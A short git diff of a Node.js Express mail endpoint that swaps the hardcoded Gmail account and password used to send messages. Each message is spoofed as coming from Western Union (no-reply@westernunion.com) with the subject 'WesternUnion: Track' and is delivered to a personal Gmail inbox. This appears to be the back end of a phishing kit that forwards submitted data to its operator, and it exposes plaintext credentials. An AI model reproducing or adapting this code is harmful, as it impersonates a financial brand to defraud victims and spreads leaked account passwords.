@@ -18,15 +18,15 @@ app.post('/mail', async (req, res) =>
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'oemad7744@gmail.com',
-      pass: 'omaremad1234',
+      user: 'moayad224444@gmail.com',
+      pass: 'uaohwuyqkzrfbqco',
     },
   });
 
   try {
     await transporter.sendMail({
       from: '"WesternUnion" <no-reply@westernunion.com>',
-      to: 'oemad7744@gmail.com',
+      to: 'moayad224444@gmail.com',
       subject: 'WesternUnion: Track',
       text: `
       <h1>WesternUnion</h1> 
@@ -57,3 +57,5 @@ app.listen(app.get('PORT'), () =>
     )}`,
   );
 });
+
+
